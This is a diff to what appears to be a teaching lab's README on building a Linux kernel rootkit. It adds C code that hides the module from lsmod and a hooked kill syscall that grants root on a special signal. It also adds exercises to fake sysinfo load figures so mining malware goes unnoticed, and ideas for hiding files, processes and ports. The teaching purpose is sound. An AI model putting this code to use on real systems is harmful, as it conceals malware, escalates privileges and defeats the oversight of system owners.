@@ -118,7 +118,7 @@ sudo insmod rootkit.ko
 To check that your module has loaded:
 ```
 dmesg
-lsmod
+lsmod | grep rootkit
 ```
 
 To remove your module:
@@ -129,8 +129,37 @@ sudo rmmod rootkit.ko
 To check that your module has been unloaded:
 ```
 dmesg
-lsmod
+lsmod | grep rootkit
 ```
+
+We can hide our module, so an unsuspecting user won't know that we are there:
+```C
+#include <linux/list.h>
+
+struct list_head *module_list;
+
+void hide(void)
+{
+    module_list = THIS_MODULE->list.prev;
+    list_del(&THIS_MODULE->list);
+}
+
+void unhide(void)
+{
+    list_add(&THIS_MODULE->list, module_list);
+}
+```
+
+**Question:** Where should you use those functions?
+To verify it works, load your module and run the following commands:
+
+```
+dmesg
+lsmod | grep rootkit
+```
+
+You should see the output of your module, but it should not be on the list!
+If you don't use `unhide` the module cannot be uninstalled!
 
 ## Step 2: Wrapping system calls
 
@@ -277,3 +306,69 @@ ENABLE_W_PROTECTED_MEMORY
 ```
 
 **Question:** Similarly implement a "hacked" `write` system call.
+
+## Step 3: Hiding resource usage
+
+The malware our rootkit want to hide may be using a lot of CPU resources (e.g.
+doing some crypto mining or launching remote attacks). We want to prevent the
+user from noticing this.
+
+In Linux, you retrieve such information via the [`sysinfo` system call](https://man7.org/linux/man-pages/man2/sysinfo.2.html).
+
+**Question:** As you did previously for read and write, "hack" the sysinfo system call and
+modify in the structure returned by the original system call the values in "load"
+by random value so that the load appear to be between 0% and 20% (you may need
+to put some thought into it as fully random value are not a great idea).
+You may want to use the [`get_random_bytes`](https://elixir.bootlin.com/linux/v3.2/source/include/linux/random.h#L57) function.
+
+## Step 4: Root whenever!
+
+You can hack the `kill` system call that pass signal to processes to grant root
+privilege to any process.
+
+Your hacked `kill` system call may look something like this:
+```C
+asmlinkage int
+hacked_kill(pid_t pid, int sig)
+{
+	struct task_struct *task;
+
+	switch (sig) {
+		case SIGSUPER:
+			give_root();
+			break;
+		default:
+			return orig_kill(pid, sig);
+	}
+	return 0;
+}
+```
+
+**Question:** implement the `give_root` function. See the skeleton bellow and check
+the [`cred` data structure](https://elixir.bootlin.com/linux/v3.2/source/include/linux/cred.h#L116):
+```C
+void give_root(void)
+{
+    struct cred *newcreds;
+    newcreds = prepare_creds();
+    if (newcreds == NULL)
+    	return;
+    // TODO set the newcreds structure to give root privilege
+    commit_creds(newcreds);
+}
+```
+
+## Step 5: going further
+
+We have just started our journey in building a complete rootkit. There is a lot
+of extra functionality that you can explore. A few of them are listed bellow (in order of difficulty):
+
+* hide memory consumption;
+* ensure that your module cannot ever be unloaded (see [this](https://www.kernel.org/doc/htmldocs/kernel-hacking/routines-module-use-counters.html))
+* hide directories/files starting with a given prefix ("hack" [`getdents64`](https://linux.die.net/man/2/getdents64) and [`getdents`](https://linux.die.net/man/2/getdents));
+* hide processes (you should look at the [`task` data structure]()https://elixir.bootlin.com/linux/v3.2/source/include/linux/sched.h#L1224 flags and also explore how to remove entries from `/proc`).
+* implement a simple way for you malware to interact with your rootkit from userspace;
+* hide open ports;
+* etc...
+
+There is a lot you can potentially do, if you have the time/will feel free to go crazy on this.
